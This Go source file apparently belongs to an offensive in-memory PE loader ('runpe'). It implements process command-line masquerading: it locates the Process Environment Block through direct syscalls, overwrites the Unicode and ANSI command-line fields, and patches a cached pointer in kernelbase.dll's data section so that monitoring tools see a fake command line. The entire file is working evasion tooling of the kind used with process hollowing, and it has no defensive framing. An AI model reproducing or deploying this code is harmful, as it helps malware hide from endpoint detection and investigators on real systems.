package runpe

import (
	"fmt"
	"github.com/Binject/debug/pe"
	"github.com/carved4/go-direct-syscall"
	"strings"
	"syscall"
	"unicode/utf16"
	"unsafe"
)

// CmdlineMasquerade holds the masqueraded command line data
type CmdlineMasquerade struct {
	OriginalCmdlineW []uint16 // Wide string original command line
	MasqueradeCmd    string   // The command line we want to masquerade as
	MasqArgvW        []string // Wide string arguments array
	MasqArgvA        []string // ANSI string arguments array
	HijackCmdline    bool     // Flag indicating if cmdline is hijacked
}

// NewCmdlineMasquerade creates a new command line masquerading instance
func NewCmdlineMasquerade(masqueradeCommand string) *CmdlineMasquerade {
	return &CmdlineMasquerade{
		MasqueradeCmd: masqueradeCommand,
		HijackCmdline: false,
	}
}

// MasqueradeCmdline performs command line masquerading equivalent to the C++ version
// This function converts the masquerade command to proper wide/ansi format for process hollowing
func (cm *CmdlineMasquerade) MasqueradeCmdline() error {
	if cm.MasqueradeCmd == "" {
		return fmt.Errorf("masquerade command cannot be empty")
	}

	// Step 1: Convert masquerade command to UTF-16 (wide string)
	masqCmdWide := utf16.Encode([]rune(cm.MasqueradeCmd))

	// Step 2: Parse command line into arguments (equivalent to CommandLineToArgvW)
	args, err := cm.parseCommandLineToArgs(cm.MasqueradeCmd)
	if err != nil {
		return fmt.Errorf("failed to parse command line: %w", err)
	}

	cm.MasqArgvW = args
	cm.MasqArgvA = args // In Go, we can use the same strings for both

	// Step 3: Store the wide string version for PEB manipulation
	cm.OriginalCmdlineW = masqCmdWide

	// Set hijack flag
	cm.HijackCmdline = true

	return nil
}

// parseCommandLineToArgs parses a command line string into individual arguments
// This is equivalent to CommandLineToArgvW in Windows
func (cm *CmdlineMasquerade) parseCommandLineToArgs(cmdline string) ([]string, error) {
	var args []string
	var current strings.Builder
	inQuotes := false
	escapeNext := false

	for i, char := range cmdline {
		if escapeNext {
			current.WriteRune(char)
			escapeNext = false
			continue
		}

		switch char {
		case '\\':
			// Check if this is escaping a quote
			if i+1 < len(cmdline) && rune(cmdline[i+1]) == '"' {
				escapeNext = true
				continue
			}
			current.WriteRune(char)

		case '"':
			inQuotes = !inQuotes

		case ' ', '\t':
			if inQuotes {
				current.WriteRune(char)
			} else {
				// End of argument
				if current.Len() > 0 {
					args = append(args, current.String())
					current.Reset()
				}
			}

		default:
			current.WriteRune(char)
		}
	}

	// Add the last argument if there is one
	if current.Len() > 0 {
		args = append(args, current.String())
	}

	if len(args) == 0 {
		return nil, fmt.Errorf("no arguments found in command line")
	}

	return args, nil
}

// GetMasqueradeCommandLineW returns the masqueraded command line as UTF-16
func (cm *CmdlineMasquerade) GetMasqueradeCommandLineW() []uint16 {
	return cm.OriginalCmdlineW
}

// GetMasqueradeArguments returns the parsed arguments
func (cm *CmdlineMasquerade) GetMasqueradeArguments() []string {
	return cm.MasqArgvA
}

// IsHijacked returns whether the command line has been hijacked
func (cm *CmdlineMasquerade) IsHijacked() bool {
	return cm.HijackCmdline
}

// ApplyPEBMasquerade applies the masqueraded command line to the Process Environment Block (PEB)
// This is the critical function that actually changes what GetCommandLine() returns
func (cm *CmdlineMasquerade) ApplyPEBMasquerade() error {
	if !cm.HijackCmdline {
		return fmt.Errorf("command line not prepared for masquerading")
	}

	// Get PEB address using direct syscall
	pebAddress, err := cm.getPEBAddress()
	if err != nil {
		return fmt.Errorf("failed to get PEB address: %w", err)
	}

	// Get process parameters from PEB
	processParams, err := cm.getProcessParameters(pebAddress)
	if err != nil {
		return fmt.Errorf("failed to get process parameters: %w", err)
	}

	// Update command line in process parameters
	err = cm.updateCommandLineInPEB(processParams)
	if err != nil {
		return fmt.Errorf("failed to update command line in PEB: %w", err)
	}

	return nil
}

// getPEBAddress gets the Process Environment Block address
func (cm *CmdlineMasquerade) getPEBAddress() (uintptr, error) {
	// Use NtQueryInformationProcess to get PEB address
	var processBasicInfo struct {
		ExitStatus                   uintptr
		PebBaseAddress               uintptr
		AffinityMask                 uintptr
		BasePriority                 uintptr
		UniqueProcessId              uintptr
		InheritedFromUniqueProcessId uintptr
	}

	var returnLength uintptr
	status, err := winapi.NtQueryInformationProcess(
		CURRENT_PROCESS,
		0, // ProcessBasicInformation
		unsafe.Pointer(&processBasicInfo),
		unsafe.Sizeof(processBasicInfo),
		&returnLength,
	)

	if err != nil {
		return 0, fmt.Errorf("NtQueryInformationProcess failed: %w", err)
	}
	if !winapi.IsNTStatusSuccess(status) {
		return 0, fmt.Errorf("NtQueryInformationProcess failed with NTSTATUS: 0x%x", status)
	}

	return processBasicInfo.PebBaseAddress, nil
}

// getProcessParameters extracts the process parameters from PEB
func (cm *CmdlineMasquerade) getProcessParameters(pebAddress uintptr) (uintptr, error) {
	// PEB structure - we need ProcessParameters at offset 0x20 (x64) or 0x10 (x32)
	var processParamsOffset uintptr
	if unsafe.Sizeof(uintptr(0)) == 8 {
		processParamsOffset = 0x20 // 64-bit
	} else {
		processParamsOffset = 0x10 // 32-bit
	}

	// Read ProcessParameters pointer from PEB
	processParamsPtr := (*uintptr)(unsafe.Pointer(pebAddress + processParamsOffset))
	if *processParamsPtr == 0 {
		return 0, fmt.Errorf("process parameters pointer is null")
	}

	return *processParamsPtr, nil
}

// updateCommandLineInPEB updates the command line in the process parameters
func (cm *CmdlineMasquerade) updateCommandLineInPEB(processParams uintptr) error {
	// RTL_USER_PROCESS_PARAMETERS structure offsets
	var cmdLineOffset, cmdLineAOffset uintptr
	if unsafe.Sizeof(uintptr(0)) == 8 {
		cmdLineOffset = 0x70  // CommandLine (Unicode) x64
		cmdLineAOffset = 0x60 // CommandLineA (ANSI) x64
	} else {
		cmdLineOffset = 0x40  // CommandLine (Unicode) x32
		cmdLineAOffset = 0x38 // CommandLineA (ANSI) x32
	}

	// === Update Unicode CommandLine ===
	err := cm.updateUnicodeCommandLine(processParams, cmdLineOffset)
	if err != nil {
		return fmt.Errorf("failed to update Unicode command line: %w", err)
	}

	// === Update ANSI CommandLineA ===
	err = cm.updateAnsiCommandLine(processParams, cmdLineAOffset)
	if err != nil {
		return fmt.Errorf("failed to update ANSI command line: %w", err)
	}

	return nil
}

// updateUnicodeCommandLine updates the Unicode CommandLine field
func (cm *CmdlineMasquerade) updateUnicodeCommandLine(processParams, cmdLineOffset uintptr) error {
	// Read current command line UNICODE_STRING for debugging
	unicodeStringAddr := processParams + cmdLineOffset

	// Allocate memory for our new command line
	masqCmdWide := cm.GetMasqueradeCommandLineW()
	masqCmdWide = append(masqCmdWide, 0) // Add null terminator

	newCmdLineSize := uintptr(len(masqCmdWide) * 2) // UTF-16 = 2 bytes per character

	var baseAddress uintptr
	status, err := winapi.NtAllocateVirtualMemory(
		CURRENT_PROCESS,
		&baseAddress,
		0,
		&newCmdLineSize,
		winapi.MEM_COMMIT|winapi.MEM_RESERVE,
		winapi.PAGE_READWRITE,
	)

	if err != nil {
		return fmt.Errorf("NtAllocateVirtualMemory failed: %w", err)
	}
	if !winapi.IsNTStatusSuccess(status) {
		return fmt.Errorf("NtAllocateVirtualMemory failed with NTSTATUS: 0x%x", status)
	}

	// Copy our masqueraded command line to the allocated memory
	dest := unsafe.Slice((*uint16)(unsafe.Pointer(baseAddress)), len(masqCmdWide))
	copy(dest, masqCmdWide)

	// Update the UNICODE_STRING structure
	newLength := uint16((len(masqCmdWide) - 1) * 2) // Exclude null terminator from length
	newMaxLength := uint16(len(masqCmdWide) * 2)    // Include null terminator in max length

	*(*uint16)(unsafe.Pointer(unicodeStringAddr)) = newLength
	*(*uint16)(unsafe.Pointer(unicodeStringAddr + 2)) = newMaxLength

	if unsafe.Sizeof(uintptr(0)) == 8 {
		*(*uintptr)(unsafe.Pointer(unicodeStringAddr + 8)) = baseAddress // 64-bit
	} else {
		*(*uintptr)(unsafe.Pointer(unicodeStringAddr + 4)) = baseAddress // 32-bit
	}

	return nil
}

// updateAnsiCommandLine updates the ANSI CommandLineA field
func (cm *CmdlineMasquerade) updateAnsiCommandLine(processParams, cmdLineAOffset uintptr) error {
	// Read current ANSI command line for debugging
	ansiStringAddr := processParams + cmdLineAOffset

	// Convert masquerade command to ANSI
	masqCmdAnsi := []byte(cm.MasqueradeCmd)
	masqCmdAnsi = append(masqCmdAnsi, 0) // Add null terminator

	newCmdLineASize := uintptr(len(masqCmdAnsi))

	var baseAddressA uintptr
	status, err := winapi.NtAllocateVirtualMemory(
		CURRENT_PROCESS,
		&baseAddressA,
		0,
		&newCmdLineASize,
		winapi.MEM_COMMIT|winapi.MEM_RESERVE,
		winapi.PAGE_READWRITE,
	)

	if err != nil {
		return fmt.Errorf("NtAllocateVirtualMemory for ANSI failed: %w", err)
	}
	if !winapi.IsNTStatusSuccess(status) {
		return fmt.Errorf("NtAllocateVirtualMemory for ANSI failed with NTSTATUS: 0x%x", status)
	}

	// Copy ANSI command line to allocated memory
	destA := unsafe.Slice((*byte)(unsafe.Pointer(baseAddressA)), len(masqCmdAnsi))
	copy(destA, masqCmdAnsi)

	// Update the ANSI STRING structure
	newLengthA := uint16(len(masqCmdAnsi) - 1) // Exclude null terminator from length
	newMaxLengthA := uint16(len(masqCmdAnsi))  // Include null terminator in max length

	*(*uint16)(unsafe.Pointer(ansiStringAddr)) = newLengthA
	*(*uint16)(unsafe.Pointer(ansiStringAddr + 2)) = newMaxLengthA

	if unsafe.Sizeof(uintptr(0)) == 8 {
		*(*uintptr)(unsafe.Pointer(ansiStringAddr + 8)) = baseAddressA // 64-bit
	} else {
		*(*uintptr)(unsafe.Pointer(ansiStringAddr + 4)) = baseAddressA // 32-bit
	}

	return nil
}

// Example usage function that can be called from ExecuteInMemory
func MasqueradeProcessCmdline(masqueradeCmd string) error {
	// Create masquerade instance
	masq := NewCmdlineMasquerade(masqueradeCmd)

	// Prepare the masqueraded command line
	err := masq.MasqueradeCmdline()
	if err != nil {
		return fmt.Errorf("failed to prepare masqueraded command line: %w", err)
	}

	// Apply to PEB (this changes what GetCommandLine() returns)
	err = masq.ApplyPEBMasquerade()
	if err != nil {
		return fmt.Errorf("failed to apply PEB masquerade: %w", err)
	}

	return nil
}

// readWideString reads a null-terminated wide string from memory
func readWideString(ptr uintptr) string {
	if ptr == 0 {
		return ""
	}

	var chars []uint16
	for i := uintptr(0); ; i += 2 {
		char := *(*uint16)(unsafe.Pointer(ptr + i))
		if char == 0 {
			break
		}
		chars = append(chars, char)
	}

	return string(utf16.Decode(chars))
}

// verifyPEBUpdate reads the command line directly from PEB to verify our update worked
func verifyPEBUpdate() (string, error) {
	// Get PEB address
	pebAddress, err := getPEBForVerification()
	if err != nil {
		return "", fmt.Errorf("failed to get PEB address: %w", err)
	}

	// Get process parameters from PEB
	processParams, err := getProcessParametersForVerification(pebAddress)
	if err != nil {
		return "", fmt.Errorf("failed to get process parameters: %w", err)
	}

	// Read Unicode CommandLine directly from PEB
	var cmdLineOffset uintptr
	if unsafe.Sizeof(uintptr(0)) == 8 {
		cmdLineOffset = 0x70 // CommandLine (Unicode) x64
	} else {
		cmdLineOffset = 0x40 // CommandLine (Unicode) x32
	}

	unicodeStringAddr := processParams + cmdLineOffset
	length := *(*uint16)(unsafe.Pointer(unicodeStringAddr))
	var buffer uintptr
	if unsafe.Sizeof(uintptr(0)) == 8 {
		buffer = *(*uintptr)(unsafe.Pointer(unicodeStringAddr + 8))
	} else {
		buffer = *(*uintptr)(unsafe.Pointer(unicodeStringAddr + 4))
	}

	if buffer == 0 {
		return "", fmt.Errorf("PEB command line buffer is NULL")
	}

	// Read the Unicode string from the buffer
	charCount := int(length) / 2 // UTF-16 = 2 bytes per character
	chars := unsafe.Slice((*uint16)(unsafe.Pointer(buffer)), charCount)

	// Convert to Go string
	return string(utf16.Decode(chars)), nil
}

// getPEBForVerification gets PEB address for verification
func getPEBForVerification() (uintptr, error) {
	var processBasicInfo struct {
		ExitStatus                   uintptr
		PebBaseAddress               uintptr
		AffinityMask                 uintptr
		BasePriority                 uintptr
		UniqueProcessId              uintptr
		InheritedFromUniqueProcessId uintptr
	}

	var returnLength uintptr
	status, err := winapi.NtQueryInformationProcess(
		CURRENT_PROCESS,
		0, // ProcessBasicInformation
		unsafe.Pointer(&processBasicInfo),
		unsafe.Sizeof(processBasicInfo),
		&returnLength,
	)

	if err != nil {
		return 0, fmt.Errorf("NtQueryInformationProcess failed: %w", err)
	}
	if !winapi.IsNTStatusSuccess(status) {
		return 0, fmt.Errorf("NtQueryInformationProcess failed with NTSTATUS: 0x%x", status)
	}

	return processBasicInfo.PebBaseAddress, nil
}

// getProcessParametersForVerification extracts the process parameters from PEB for verification
func getProcessParametersForVerification(pebAddress uintptr) (uintptr, error) {
	var processParamsOffset uintptr
	if unsafe.Sizeof(uintptr(0)) == 8 {
		processParamsOffset = 0x20 // 64-bit
	} else {
		processParamsOffset = 0x10 // 32-bit
	}

	processParamsPtr := (*uintptr)(unsafe.Pointer(pebAddress + processParamsOffset))
	if *processParamsPtr == 0 {
		return 0, fmt.Errorf("process parameters pointer is null")
	}

	return *processParamsPtr, nil
}

// updateCacheInModule searches for and updates the cached pointer in a specific module
func updateCacheInModule(moduleName string, currentCachedPtr, newCommandLinePtr uintptr) error {
	// Get the base address of the module in our process
	moduleHandle, err := syscall.LoadLibrary(moduleName)
	if err != nil {
		return fmt.Errorf("failed to load %s: %w", moduleName, err)
	}
	defer syscall.FreeLibrary(moduleHandle)

	moduleBase := uintptr(moduleHandle)

	// Read module from disk to parse its PE structure
	var modulePath string
	modulePath = "C:\\Windows\\System32\\kernelbase.dll"

	moduleFile, err := pe.Open(modulePath)
	if err != nil {
		return fmt.Errorf("failed to open %s PE: %w", moduleName, err)
	}
	defer moduleFile.Close()

	// Search in multiple sections where the cache might be stored
	sectionsToSearch := []string{".data"}

	for _, sectionName := range sectionsToSearch {

		err := updateCacheInSection(moduleFile, moduleBase, sectionName, currentCachedPtr, newCommandLinePtr)
		if err == nil {

			return nil
		}

	}

	return fmt.Errorf("cached pointer not found in any section of %s", moduleName)
}

// updateCacheInSection searches for and updates the cached pointer in a specific section
func updateCacheInSection(moduleFile *pe.File, moduleBase uintptr, sectionName string, currentCachedPtr, newCommandLinePtr uintptr) error {
	// Find the specified section
	var targetSection *pe.Section
	for _, section := range moduleFile.Sections {
		if section.Name == sectionName {
			targetSection = section
			break
		}
	}

	if targetSection == nil {
		return fmt.Errorf("%s section not found", sectionName)
	}

	// Calculate the section address in memory
	sectionStart := moduleBase + uintptr(targetSection.VirtualAddress)
	sectionSize := uintptr(targetSection.VirtualSize)

	// Scan the section for our cached pointer
	for offset := uintptr(0); offset <= sectionSize-unsafe.Sizeof(uintptr(0)); offset += unsafe.Sizeof(uintptr(0)) {
		addr := sectionStart + offset

		// Safely read the pointer value
		var value uintptr
		err := readMemorySafe(addr, unsafe.Pointer(&value), unsafe.Sizeof(value))
		if err != nil {
			continue // Skip inaccessible memory
		}

		// Check if this matches our current cached pointer
		if value == currentCachedPtr {

			// Update the cached pointer
			err = writeMemorySafe(addr, unsafe.Pointer(&newCommandLinePtr), unsafe.Sizeof(newCommandLinePtr))
			if err != nil {
				return fmt.Errorf("failed to update cached pointer: %w", err)
			}

			return nil
		}
	}

	return fmt.Errorf("cached pointer 0x%x not found in %s section", currentCachedPtr, sectionName)
}

// readMemorySafe safely reads memory with error handling
func readMemorySafe(addr uintptr, dest unsafe.Pointer, size uintptr) error {
	defer func() {
		if r := recover(); r != nil {
			// Memory access violation - ignore
		}
	}()

	// Use NtReadVirtualMemory for safer memory access
	var bytesRead uintptr
	status, err := winapi.NtReadVirtualMemory(
		CURRENT_PROCESS,
		addr,
		dest,
		size,
		&bytesRead,
	)

	if err != nil {
		return err
	}
	if !winapi.IsNTStatusSuccess(status) {
		return fmt.Errorf("NtReadVirtualMemory failed with status: 0x%x", status)
	}
	if bytesRead != size {
		return fmt.Errorf("partial read: expected %d bytes, got %d", size, bytesRead)
	}

	return nil
}

// writeMemorySafe safely writes memory with error handling
func writeMemorySafe(addr uintptr, src unsafe.Pointer, size uintptr) error {
	defer func() {
		if r := recover(); r != nil {
			// Memory access violation - ignore
		}
	}()

	// Use NtWriteVirtualMemory for safer memory access
	var bytesWritten uintptr
	status, err := winapi.NtWriteVirtualMemory(
		CURRENT_PROCESS,
		addr,
		src,
		size,
		&bytesWritten,
	)

	if err != nil {
		return err
	}
	if !winapi.IsNTStatusSuccess(status) {
		return fmt.Errorf("NtWriteVirtualMemory failed with status: 0x%x", status)
	}
	if bytesWritten != size {
		return fmt.Errorf("partial write: expected %d bytes, wrote %d", size, bytesWritten)
	}

	return nil
}
